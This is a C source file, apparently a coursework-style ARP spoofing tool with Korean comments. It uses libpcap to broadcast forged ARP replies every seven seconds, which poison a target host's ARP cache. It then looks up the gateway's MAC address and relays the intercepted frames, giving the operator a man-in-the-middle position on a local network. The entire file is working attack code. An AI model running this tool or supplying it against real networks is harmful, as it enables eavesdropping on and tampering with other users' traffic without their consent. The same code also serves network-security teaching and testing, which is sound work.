#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <netinet/in.h>
#include "arpheader.h"


void* thread_infect (void* arg)   //감염패킷킷
{
    while(1)
    {
        struct jsave * addr_save = (struct jsave *)arg;
        printf("#########################################감염 패킷 \n");

       //my mac 구하는 함수  -------------------------------
      struct ifreq s;
      int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

      strcpy(s.ifr_name, "wlan0");
      ioctl(fd, SIOCGIFHWADDR, &s);

      printf("My Mac Address : ");
      for (int x = 0; x < 6; ++x){
      printf("%02x ", (u_char) s.ifr_addr.sa_data[x]);
      addr_save->mymac[x] = (u_char) s.ifr_addr.sa_data[x];
      }
      printf("\n");

      //--------------------------------------------


      u_char pkt[PACKETSIZE];
      struct allpacket *s_packet = (struct allpacket *)pkt;
      //패킷 입력 시
//       dmac search------------------------------------- Destination 입력
      printf("dmac ::");
      for(int i=0; i<=5;i++)
      {
          s_packet->eth_dmac[i] = addr_save->save_smac[i]; //목적지 받은은 패킷의 시작 주소
          printf("%x ",s_packet->eth_dmac[i]);
      }
      printf("\n");
      //smac --------------------------------------------
      for(int i=0;i<6;i++)
      {
          s_packet->eth_smac[i] = (u_char) s.ifr_addr.sa_data[i];
      }


      printf("smac :");
        for(int i=0; i<=5;i++)
        {
            //s_packet->eth_smac[i] = (u_char)s.ifr_addr.sa_data[i];  //보낼 패킷의 시작은 나의 mac 입력
            printf("%02x ",s_packet->eth_smac[i]);
        }
//        printf("\n");


          s_packet->type = ntohs(0x0806);                       //  ARP 0x0806
          printf("type : %04x\n",s_packet->type);
                                                                //ARP-----------------------------
          s_packet->hd_type = ntohs(0x0001);                    // HardWare type : ethernet 1
          printf("hd_type %04x\n",s_packet->hd_type);

          s_packet->protocol_type = ntohs(0x0800);               // Protocol type : IPv4 0x0800
          printf("protocol_type %04x\n",s_packet->protocol_type);

          s_packet->hd_size = 0x06;                             // Hardware size 6 , Protocol size 4
          s_packet->protocol_size = 0x04;

          printf("hd_size %02x\n",s_packet->hd_size);
          printf("protocol_size %02x\n",s_packet->protocol_size);

          s_packet->opcode = ntohs(0x0002);                     // OPcode 1 = request ,2 = reply
          printf("opcode %04x\n",s_packet->opcode);


          printf("sender mac : ");                        // 나의 mac 입력
          for(int i=0; i<=5;i++)
          {
               s_packet->arp_sender_mac[i] = s_packet->eth_smac[i] ;
               printf(" %02x ", s_packet->arp_sender_mac[i]);
          }
          printf("\n");

                                                        //sender(피해자)의 IP (게이트웨이)
          //inet_aton(addr_save->save_tip,&s_packet->arp_sender_ip);
          s_packet->arp_sender_ip = addr_save->save_tip;
          printf("Sender IP %x \n",s_packet->arp_sender_ip);
          printf("\n");


          printf("Target Mac : ");                      // 속일 mac 주소 (감염시킬 pc의 주소)
          for(int i=0; i<=5;i++)
          {
               s_packet->arp_target_mac[i] = addr_save->save_smac[i] ;  //받은 패킷의 시작 주소
               printf(" %02x ", s_packet->arp_target_mac[i]);
          }
          printf("\n");


          //inet_aton(addr_save->save_sip,&s_packet->arp_target_ip);  // 감염시키려는 ip 주소
          s_packet->arp_target_ip = addr_save->save_sip;
          printf("target IP = %x \n", s_packet->arp_target_ip);


          int res = pcap_sendpacket(addr_save->handle,pkt,sizeof(pkt));

          if(res == -1)
                 printf(" error\n");
          else
                printf("**********************************감염패킷 전송 성공! \n");

        sleep(7);
    }
}

void* thread_relay (void* arg)
{
    struct jsave * add_save = (struct jsave *) arg;
    char errbuf [PCAP_ERRBUF_SIZE];
    int res;
    pcap_t* handle = pcap_open_live("wlan0",BUFSIZ,1,1,errbuf);
    struct pcap_pkthdr * header;
    const u_char* packet;
    while(1)
    {
       pcap_next_ex(handle,&header,&packet);

       u_int pktsize = header->caplen;
       u_char cp_packet[pktsize];
       // struct iphdr * ip_hdr = (struct iphdr *)add_save->packet +14;
       struct ether_header * eth_hdr = (struct ether_header *)packet;


       if(eth_hdr->ether_shost[0] == add_save->save_tmac[0] && eth_hdr->ether_shost[1] == add_save->save_tmac[1] && eth_hdr->ether_shost[2] == add_save->save_tmac[2]
               && eth_hdr->ether_shost[3] == add_save->save_tmac[3] && eth_hdr->ether_shost[4] == add_save->save_tmac[4] && eth_hdr->ether_shost[5] == add_save->save_tmac[5])
          for(int i =0;i<6;i++){
              eth_hdr->ether_shost[i]=add_save->mymac[i];
              eth_hdr->ether_dhost[i]=add_save->gateway[i];

              //memcpy(&eth_hdr->ether_dhost[i],&add_save->gateway[i],sizeof (add_save->gateway[i]));
              //memcpy(&eth_hdr->ether_shost[i],&add_save->mymac[i],sizeof (add_save->mymac[i]));
          }

/*
            eth_hdr->ether_shost[0] = 0x88;
            eth_hdr->ether_shost[1] = 0x36;
            eth_hdr->ether_shost[2] = 0x6c;
            eth_hdr->ether_shost[3] = 0xfa;
            eth_hdr->ether_shost[4] = 0xbc;
            eth_hdr->ether_shost[5] = 0xfa;

            eth_hdr->ether_dhost[0] = 0x08;
            eth_hdr->ether_dhost[1] = 0x5d;
            eth_hdr->ether_dhost[2] = 0xdd;
            eth_hdr->ether_dhost[3] = 0x79;
            eth_hdr->ether_dhost[4] = 0xff;
            eth_hdr->ether_dhost[5] = 0x05;
*/
            memcpy(cp_packet,packet,pktsize);
            res = pcap_sendpacket(handle,cp_packet,(int)pktsize);

           if(res == -1)
                  printf(" error\n");
           else
                 printf("**********************************relay 전송 성공! \n");


           printf("====================================================\n");
           printf("dmac :");
           for(int i=0;i<6;i++)
               printf(" %02x ",eth_hdr->ether_dhost[i]);
           printf("\n");

           printf("smac :");
           for(int i=0;i<6;i++)
               printf(" %02x ",eth_hdr->ether_shost[i]);
           printf("\n");
           printf("type : %04x\n",ntohs(eth_hdr->ether_type));
           printf("====================================================\n");
       printf("Search\n");

    }


}



int main(int argc, char* argv[]) {

      if (argc <= 2 || argc%2 == 1) {
         printf("error\n");
         return -1;
       }
      pcap_t *handle;
      const u_char* packet;
      struct pcap_pkthdr* header;

      char* dev = argv[1];
      char errbuf[PCAP_ERRBUF_SIZE];
      handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
      if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
      }

      for(int i=1;i<=argc/2-1;i++)
      {
        broadcast(argv,handle);       //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
      }

//------------------------------------------------------------------------------------------------------
      struct jsave * addr_save;
      pthread_t jthread[2];
      while(1){                                                 //감염 패킷 쓰레드
          pcap_next_ex(handle,&header,&packet);
          struct allpacket * new_packet = (struct allpacket *)packet;


          addr_save = (struct jsave *) malloc(sizeof (struct jsave));
          if(ntohs(new_packet->type)==ETHERTYPE_ARP && ntohs(new_packet->opcode) == ARPOP_REPLY && new_packet->arp_sender_ip ==inet_addr(argv[2]))
          {
              //memcpy(&addr_save->save_sip,&new_packet->arp_sender_ip,sizeof (new_packet->arp_sender_ip));
              //memcpy(&addr_save->save_tip,&new_packet->arp_target_ip,sizeof (new_packet->arp_target_ip));
                addr_save->save_sip = new_packet->arp_sender_ip;
                addr_save->save_tip = new_packet->arp_target_ip;
              for(int i=0;i<6;i++)
              {
                 //memcpy(&addr_save->save_smac[i],&new_packet->eth_smac[i],sizeof (new_packet->eth_smac));
                 //memcpy(&addr_save->save_tmac[i],&new_packet->eth_dmac[i],sizeof (new_packet->eth_dmac));
                 addr_save->save_smac[i]=new_packet->eth_smac[i];
                 addr_save->save_tmac[i]=new_packet->eth_dmac[i];
              }
              addr_save->handle = handle;

              pthread_create(&jthread[0],NULL,thread_infect,(void *)addr_save);            //감염함수 :: 성공
              break;
          }
         }
//-----------------------------------------------------------------------------------------------------
      sleep(2);
      gateway_mac(argv,handle);

      sleep(1);
      printf("게이트웨이 주소 !");
      while(1)
      {
         pcap_next_ex(handle,&header,&packet);
         struct allpacket * rcv_packet = (struct allpacket *) packet;
         if(rcv_packet->arp_sender_ip == addr_save->save_tip && ntohs(rcv_packet->type) == ETHERTYPE_ARP && ntohs(rcv_packet->opcode) == ARPOP_REPLY)
            {
                for(int i =0;i<6;i++){
                    //memcpy(&addr_save->gateway[i],&rcv_packet->eth_smac[i],sizeof(rcv_packet->eth_smac));
                    addr_save->gateway[i]=rcv_packet->eth_smac[i];
                    printf("%02x ",(unsigned int)addr_save->gateway[i]);
                }
                printf("\n");
                printf("게이트웨이 주소 획득! \n");
                break;
            }
      }

      addr_save->header = header;
      addr_save->packet = packet;

      pthread_create(&jthread[1],NULL,thread_relay,(void *)addr_save);

      while(1)
      {
         sleep(3);
         printf("Search\n");

      }
      pcap_close(handle);
      return 0;
}

